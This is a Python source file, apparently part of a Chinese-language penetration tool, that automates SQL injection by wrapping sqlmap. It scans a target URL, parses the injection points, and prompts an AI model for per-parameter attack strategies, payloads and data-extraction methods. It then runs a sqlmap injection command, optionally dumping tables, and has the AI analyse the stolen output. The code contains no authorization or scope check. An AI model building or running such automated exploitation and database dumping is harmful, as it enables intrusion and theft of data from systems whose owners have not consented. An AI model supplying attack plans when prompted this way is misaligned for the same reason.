import os
import re
import subprocess
import sys
import tempfile
import json
from .config import load_config, get_api_key
from .ai_integration import call_ai_model, generate_smart_payload, analyze_injection_results
from .i18n import _
from pathlib import Path

def parse_scan_results(scan_output):
    """
    解析sqlmap扫描输出，提取注入点和数据库类型信息
    """
    injection_points = []
    
    # 查找注入点
    injection_point_pattern = r"Parameter:\s*'([^']+)'.*Type:\s*([^(]+).*Title:\s*([^\n]+)"
    injection_matches = re.finditer(injection_point_pattern, scan_output, re.DOTALL)
    
    for match in injection_matches:
        param = match.group(1)
        vuln_type = match.group(2).strip()
        title = match.group(3).strip()
        injection_points.append({
            'parameter': param,
            'type': vuln_type,
            'title': title
        })
    
    # 查找数据库类型
    dbms_match = re.search(r"back-end DBMS:\s*([^\n]+)", scan_output)
    dbms = dbms_match.group(1).strip() if dbms_match else "unknown"
    
    return {
        'injection_points': injection_points,
        'dbms': dbms
    }

def analyze_vulnerability(scan_info):
    """
    分析漏洞，使用AI生成攻击策略
    """
    if not scan_info['injection_points']:
        return "未发现注入点，无法进行自动注入"
    
    dbms = scan_info['dbms']
    points = scan_info['injection_points']
    
    prompt = f"""
我发现了以下SQL注入点，请分析并提供针对性的攻击策略:

数据库类型: {dbms}
注入点数量: {len(points)}

注入点详情:
"""
    
    for i, point in enumerate(points, 1):
        prompt += f"{i}. 参数: {point['parameter']}, 类型: {point['type']}, 描述: {point['title']}\n"
    
    prompt += """
请提供:
1. 每个注入点的最优攻击方式
2. 推荐的payload
3. 预期的数据提取方法
4. 攻击的风险评估
"""
    
    try:
        result = call_ai_model(prompt)
        return result
    except Exception as e:
        return f"AI分析失败: {str(e)}"

def generate_inject_command(url, scan_info, options=None):
    """
    根据扫描信息生成注入命令
    """
    if not scan_info['injection_points']:
        return None
    
    # 使用第一个注入点生成命令
    point = scan_info['injection_points'][0]
    dbms = scan_info['dbms']
    
    # 基本的sqlmap命令
    cmd = ["python", "sqlmap.py", "-u", url]
    
    # 添加参数信息
    cmd.extend(["-p", point['parameter']])
    
    # 添加数据库类型
    if dbms and dbms.lower() != "unknown":
        cmd.extend(["--dbms", dbms])
    
    # 添加其他选项
    if options:
        for option, value in options.items():
            if value is True:
                cmd.append(f"--{option}")
            elif value is not False and value is not None:
                cmd.extend([f"--{option}", str(value)])
    
    return cmd

def auto_inject(url, options=None):
    """
    执行自动扫描和注入过程
    """
    if options is None:
        options = {}
    
    results = {
        'scan_output': '',
        'analysis': '',
        'injection_output': '',
        'success': False
    }
    
    # 步骤1: 进行扫描
    print(_("[*] 开始扫描目标URL以寻找SQL注入漏洞..."))
    scan_cmd = ["python", "sqlmap.py", "-u", url, "--batch"]
    
    # 设置超时选项
    if "timeout" in options:
        scan_cmd.extend(["--timeout", str(options["timeout"])])
    
    # 是否包含详细输出
    if options.get("verbose", False):
        scan_cmd.append("-v")
    
    try:
        scan_process = subprocess.Popen(
            scan_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        scan_output, scan_error = scan_process.communicate()
        results['scan_output'] = scan_output
        
        if scan_process.returncode != 0 and "vulnerability" not in scan_output.lower():
            print(_("[-] 扫描失败或未发现漏洞"))
            results['analysis'] = "扫描失败或未发现漏洞"
            return results
        
        print(_("[+] 扫描完成，正在分析结果..."))
        
        # 步骤2: 解析扫描结果
        scan_info = parse_scan_results(scan_output)
        
        if not scan_info['injection_points']:
            print(_("[-] 未发现注入点"))
            results['analysis'] = "未发现注入点"
            return results
        
        # 步骤3: 使用AI分析漏洞
        print(_("[*] 正在使用AI分析漏洞并生成攻击策略..."))
        analysis = analyze_vulnerability(scan_info)
        results['analysis'] = analysis
        print(_("[+] AI分析完成"))
        print("\n" + analysis + "\n")
        
        # 步骤4: 生成并执行注入命令
        inject_cmd = generate_inject_command(url, scan_info, options)
        
        if not inject_cmd:
            print(_("[-] 无法生成注入命令"))
            return results
        
        # 添加数据提取选项
        if options.get("dump", False):
            inject_cmd.append("--dump")
        
        # 添加指定表的选项
        if "tables" in options:
            inject_cmd.extend(["--tables", options["tables"]])
        
        print(_("[*] 开始执行自动注入..."))
        print(_("[*] 执行命令: {}").format(" ".join(inject_cmd)))
        
        inject_process = subprocess.Popen(
            inject_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        inject_output, inject_error = inject_process.communicate()
        results['injection_output'] = inject_output
        
        if inject_process.returncode != 0:
            print(_("[-] 注入执行失败"))
            print(inject_error)
        else:
            print(_("[+] 自动注入完成"))
            results['success'] = True
            
            # 如果成功且提取了数据，分析结果
            if options.get("dump", False) and "available databases" in inject_output.lower():
                print(_("[*] 正在分析注入数据..."))
                data_analysis = analyze_injection_results(inject_output, scan_info)
                print(_("[+] 数据分析完成"))
                print("\n" + data_analysis + "\n")
                results['data_analysis'] = data_analysis
        
        return results
    
    except Exception as e:
        print(_("[-] 自动注入过程中发生错误: {}").format(str(e)))
        results['analysis'] = f"错误: {str(e)}"
        return results 